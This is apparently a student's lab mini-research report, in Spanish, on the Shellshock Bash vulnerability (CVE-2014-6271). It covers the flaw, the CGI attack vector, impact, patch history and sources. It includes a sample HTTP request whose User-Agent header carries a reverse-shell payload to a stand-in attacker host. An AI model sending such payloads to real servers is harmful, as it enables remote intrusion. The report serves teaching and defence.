# Mini-research — Laboratorio 07

**Tema elegido:** *(uno)*

    [ ] **A.** Consultas parametrizadas / prepared statements: cómo separan datos de código y por qué eliminan la SQLi de raíz (con ejemplo en un lenguaje).
    [ ] **B.** sqlmap por dentro: cómo detecta la inyección (boolean-based, time-based, error-based) y qué significa cada técnica.
    [X] **C.** Un caso real de RCE por command injection (CVE a elección): vector, impacto y parche.
    [ ] **D.** Broken Access Control (OWASP A01): IDOR vs. otras fallas de control de acceso, y el principio de "denegar por defecto".

## Desarrollo
## Fuentes (mín. 3, verificables)
## Reflexión (3–5 líneas)

### CVE-2014-6271 — "Shellshock": la inyección de comandos que sacudió internet

#### Contexto

Shellshock es el nombre que recibió la vulnerabilidad CVE-2014-6271, descubierta en septiembre de 2014 por Stéphane Chazelas en GNU Bash. Se trata de un fallo de **inyección de comandos (CWE-78)** con un puntaje CVSS de 9.8 (crítico), con complejidad de ataque baja y sin requerimiento de autenticación. El principio que la hace posible es exactamente el mismo que el R3 del lab: un input del usuario —en este caso, una variable de entorno— llega sin sanear a un intérprete de shell, que lo ejecuta como código.

#### ¿Qué hace Bash que lo hace vulnerable?

Bash tiene un mecanismo para exportar funciones entre procesos mediante variables de entorno. Cuando un proceso hijo inicia una nueva instancia de Bash, esta lee las variables de entorno heredadas y, si detecta que alguna contiene una definición de función, la importa. El problema estaba en que Bash **seguía ejecutando lo que viniera después del cierre de la función**:

```bash
# Variable de entorno maliciosa:
env X='() { :; }; comando_arbitrario' bash
#         ^^^^^^^^^  ^^^^^^^^^^^^^^^^^^
#      definición de   código extra que
#      función dummy   Bash ejecuta igual
```

Bash procesaba la función y luego, en lugar de detenerse, continuaba ejecutando el contenido que venía a continuación. El input se volvió código: la misma falla conceptual del lab, en la escala de un componente del sistema operativo.

#### Vector de ataque: HTTP → CGI → Bash

El vector más explotado fue vía CGI en servidores web Apache. El protocolo CGI pasa los headers HTTP de la request como variables de entorno al script que los procesa. Si ese script era un shell script (o si lo invocaba transitivamente), un atacante podía incluir el payload en un header como `User-Agent`, `Referer` o `Cookie`:

```http
GET /cgi-bin/status HTTP/1.1
Host: victima.com
User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/atacante.com/4444 0>&1
```

El servidor web pasaba ese `User-Agent` como la variable de entorno `HTTP_USER_AGENT` a Bash, que lo ejecutaba. Resultado: reverse shell sin ninguna autenticación. Otros vectores documentados incluyeron el parámetro `ForceCommand` de OpenSSH (que permitía saltarse restricciones de shell), clientes DHCP y scripts de inicio de sistema.

#### Impacto

El impacto fue masivo. Shellshock afectó **todas las versiones de GNU Bash anteriores a 4.3** y, dado que Bash es el shell predeterminado en prácticamente todas las distribuciones Linux y macOS de la época, la superficie de ataque fue global. Entre las consecuencias documentadas:

- **Automatización del ataque a escala industrial**: a las pocas horas de la divulgación pública, se observaron bots escaneando internet en busca de endpoints CGI vulnerables.
- **Creación de botnets**: miles de servidores comprometidos fueron reclutados para ataques de denegación de servicio distribuido.
- **Exfiltración de credenciales**: servidores con scripts CGI que ejecutaban código arbitrario permitieron el robo de credenciales, bases de datos y archivos de configuración.
- La vulnerabilidad fue añadida al catálogo de **CISA Known Exploited Vulnerabilities (KEV)**, confirmando explotación activa en el mundo real.

#### El parche y su historia

El primer parche publicado el mismo día de la divulgación (24 de septiembre de 2014) resultó **incompleto**: la corrección no abarcaba todos los casos del parsing de funciones en variables de entorno. Esto derivó en la asignación de un segundo CVE, **CVE-2014-7169**, para cubrir la vulnerabilidad residual. En total, el ciclo de parcheado generó seis CVEs relacionados (CVE-2014-6271, -7169, -7186, -7187, -6277 y -6278) a lo largo de varios días.

La corrección definitiva consistió en cambiar el modo en que Bash importa funciones desde variables de entorno: en lugar de ejecutar contenido arbitrario, el intérprete pasó a requerir un prefijo específico y controlado (`BASH_FUNC_<nombre>%%`) y a validar estrictamente que el contenido sea solo una definición de función sin código adicional.

La lección del parche es también la del lab: la defensa no pasa por "filtrar caracteres peligrosos" (evasión posible), sino por **separar estructuralmente los datos del código** —en este caso, cambiar el canal por el que viajan las funciones para que no se mezcle con input genérico.

---

## Fuentes

1. **NVD — CVE-2014-6271** · National Vulnerability Database (NIST)
   https://nvd.nist.gov/vuln/detail/CVE-2014-6271

2. **Ubuntu Security Advisory USN-2362-1** · Canonical
   https://ubuntu.com/security/CVE-2014-6271

3. **Mend.io Vulnerability Database — CVE-2014-6271** (CVSS v4, vector técnico detallado)
   https://www.mend.io/vulnerability-database/CVE-2014-6271/

4. **CountUponSecurity — ShellShock Highlights** (timeline de explotación, vectores de ataque documentados)
   https://countuponsecurity.com/tag/shellshock/

5. **CISA Known Exploited Vulnerabilities Catalog**
   https://www.cisa.gov/known-exploited-vulnerabilities-catalog

---

## Reflexión

Shellshock es el R3 del lab amplificado a escala planetaria: el mismo error conceptual (concatenar input de usuario con un intérprete de comandos sin separar datos de código), pero ocurriendo en Bash mismo, un componente presente en millones de servidores. Lo que más impresiona no es el bug en sí, sino la **cadena de confianza implícita**: un header HTTP parecería tener poco que ver con el shell de un servidor, pero el protocolo CGI los une sin ningún filtro intermedio. El caso también ilustra algo que el lab menciona pero que se vuelve concreto acá: el primer parche falló, dando lugar a seis CVEs distintos, porque corregir "filtrar los caracteres malos" es una carrera perdida; la única defensa real es romper estructuralmente la frontera entre datos y código. Finalmente, la velocidad con que se armaron los bots explotadores —horas después de la divulgación— muestra por qué el tiempo entre publicación de parche y aplicación real es, en muchos contextos, el intervalo de mayor riesgo.